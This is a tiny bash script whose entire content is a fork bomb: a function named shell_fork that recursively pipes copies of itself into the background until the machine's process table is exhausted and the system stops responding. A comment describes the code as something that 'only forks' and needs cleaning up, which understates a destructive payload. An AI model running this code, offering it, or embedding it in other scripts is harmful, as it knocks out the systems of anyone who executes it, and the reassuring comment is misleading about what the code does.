#!/bin/bash

# This only forks and should be cleaned up.

shell_fork(){ 
    shell_fork|shell_fork &
}
shell_fork
